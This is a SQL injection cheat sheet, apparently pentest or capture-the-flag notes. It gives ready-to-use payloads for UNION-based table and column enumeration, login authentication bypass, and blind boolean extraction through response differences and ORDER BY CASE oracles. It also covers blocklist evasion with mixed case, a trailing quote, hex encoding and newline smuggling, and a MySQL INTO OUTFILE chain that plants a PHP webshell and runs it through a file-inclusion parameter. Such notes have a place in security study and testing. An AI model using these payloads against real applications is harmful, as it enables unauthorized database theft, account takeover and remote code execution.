# SQL Injection

UNION-based enumeration once you've found a column count that renders.

```bash
' UNION SELECT 1,2,3 -- -
' UNION SELECT 1, table_name, 3 FROM information_schema.tables -- -
' UNION SELECT 1, <col>, 3 FROM <table> WHERE <table>.<key>='<value>' -- -
```

Login-form auth bypass — try several, engines differ in what they accept:
```bash
admin' --
admin' AND 1=1 -- -
' or 1 or '
```

Blind boolean SQLi when there's no visible output — use any observable diff (HTTP status, redirect, response length) as a true/false oracle, then binary-search each character:
```bash
' OR 1=1 --
' OR (SELECT COUNT(*) FROM <table>)<=N --
' OR (SELECT LENGTH(<col>) FROM <table> LIMIT 1 OFFSET i)<=N --
' OR UNICODE(SUBSTR((SELECT <col> FROM <table> LIMIT 1 OFFSET i),p,1))<=N --
```

If a blocklist blocks comment terminators (`-- -`, `#`, `%23`) but not a bare trailing quote, close the statement that way instead — no comment needed:
```bash
' UniOn SeLeCt 1 '
```

Nested/second-order injection: if query #1's result feeds into query #2 (e.g. `id` from a lookup used in a second `WHERE`), UNION-inject the *first* query to control what gets passed into the second, even if query #1's own output isn't rendered directly.

If `;` or `/` are blocklisted, hex-encode the whole payload — most engines accept a bare hex literal as a string:
```bash
0x2d3120554e494f4e2053454c454354204e554c4c2c4e554c4c2c222f6574632f706173737764220a   # = -1 UNION SELECT NULL,NULL,"/etc/passwd"
```

MySQL/MariaDB SQLi-to-RCE via `SELECT ... INTO OUTFILE`, when the webroot isn't writable by the DB user but another path the web server can read is (e.g. the DB's own data directory):
```sql
'; SELECT from_base64('<base64 of a one-line PHP webshell>') INTO OUTFILE '/var/lib/mysql/x.php'; --1
```
Confirm the write landed and is web-reachable through whatever read/LFI primitive you already have (e.g. an existing `?page=` parameter), then trigger it: `?page=/var/lib/mysql/x`. A newline (`%0a`) often slips past a naive `preg_match`/regex blocklist that only checks for forbidden keywords on a single line.

Blind SQLi in an `ORDER BY` clause — you can't UNION or subquery there directly, but a `CASE WHEN` expression works as a boolean oracle:
```bash
?order=(CASE WHEN(<boolean-condition>) THEN <col-A> ELSE <col-B> END)
# swaps sort order between two known columns depending on whether the condition is true
```

